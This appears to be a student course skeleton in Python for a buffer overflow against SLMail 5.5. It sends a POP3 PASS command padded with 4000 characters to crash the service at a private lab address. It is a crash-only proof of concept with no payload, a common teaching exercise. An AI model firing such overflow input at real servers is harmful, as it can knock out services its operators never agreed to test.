# Programming For Cybersecurity course - Project
# Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
#
# Author: Tomasz
#
# This is a skeleton which will be used to develop an exploit.


import sys
import socket

try:
    #Buffer to be sent towards the target, we expect it to crash the vulnerable application due to overflowing of the buffer.
    buffer = 'A' * 4000   
    TARGET = '192.168.100.1' 
    PORT = 110
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Connect to IP
    s.connect((TARGET, PORT))
    data = s.recv(1024)                # Receive Banner
    s.send('USER username'+'\r\n')     # Send Username
    data = s.recv(1024)                # Receive Reply
    s.send('PASS ' + buffer + '\r\n')  # Sent Password and  buffer
    s.close()
except:
    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')